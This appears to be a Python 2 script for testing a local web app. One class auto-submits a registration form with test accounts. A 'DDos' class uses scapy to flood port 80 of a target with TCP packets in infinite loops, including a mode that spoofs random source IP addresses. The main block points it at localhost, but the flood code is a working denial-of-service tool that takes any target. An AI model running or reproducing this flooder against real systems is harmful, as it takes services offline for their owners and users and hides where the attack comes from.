import mechanize # sudo apt-get install python-mechanize; pip install mechanize
from scapy.all import *

class Tempering():
  """
    tempering with client-side parameter, POST, GET
    It tests if user input is correct and in proper format.
  """
  def __init__(self, user, userPass):
    self.user = user
    self.userPass = userPass

  def optainForms(self, url):
    br = mechanize.Browser()
    
    # browser options that helps in redirection and robots.txt
    br.set_handle_robots( False )
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)

    br.open(url)
    # get fields to be filled and change them in addValuesToForm
    for form in br.forms():
      print form
    self.addValuesToForm(br)

  def addValuesToForm(self, br):
    br.select_form(nr=0)
    br.form['username'] = self.user
    br.form['email'] = 'test@gmail.com'
    br.form['password'] = self.userPass
    br.form['confirm_password'] = self.userPass
    br.submit()

class DDos():

  def singleIPsinglePort(self, srcIP, target, srcPort):
    i=1
    while True:
      IP1 = IP(src=srcIP, dst=target)
      TCP1 = TCP(sport=srcPort, dport=80)
      pkt = IP1 / TCP1
      send(pkt,inter= .001)
      print "packet sent ", i
      i=i+1

  def singleIPmultiPort(self, srcIP, target):
    i=1
    while True:
      for srcPort in range(1,65535):
        IP1 = IP(src=srcIP, dst=target)
        TCP1 = TCP(sport=srcPort, dport=80)
        pkt = IP1 / TCP1
        send(pkt,inter= .0001)
        print "packet sent: %s \t port: %s " % (i, srcPort)
        i=i+1

  def multiIPmultiPort(self, target):
    i=1
    while True:
      a = str(random.randint(1,254))
      b = str(random.randint(1,254))
      c = str(random.randint(1,254))
      d = str(random.randint(1,254))
      dot = "."
      src = a+dot+b+dot+c+dot+d
      print src
      st = random.randint(1,1000)
      en = random.randint(1000,65535)
      loop_break = 0
      repeat = random.randint(1,4)   # how many times uses the same ip port
      for srcPort in range(st,en):
        IP1 = IP(src=src, dst=target)
        TCP1 = TCP(sport=srcPort, dport=80)
        pkt = IP1 / TCP1
        send(pkt,inter= .0001)
        print "packet sent: %s\tsrcIP: %s\tsrcPort:%s" % (i, src, srcPort )
        loop_break = loop_break+1
        i=i+1
        if loop_break == repeat:
          break

if __name__ == '__main__':
  for i in range(1,2):
    user = userPass = 'testtest%s' % i
    myTempering = Tempering(user, userPass)
    url = 'http://localhost:8010/pass_away/register/'
    myTempering.optainForms(url)
  
  srcIP = '192.168.11.251'
  target = '127.0.0.1'
  srcPort = 8010
  #srcIP = raw_input("Enter the Source IP ")
  #target = raw_input("Enter the Target IP ")
  #srcPort = int(raw_input("Enter the Source Port "))
  myDDos = DDos()
  # run as sudo user
  #myDDos.singleIPsinglePort(srcIP, target, srcPort)
  #myDDos.singleIPmultiPort(srcIP, target)
  myDDos.multiIPmultiPort(target)

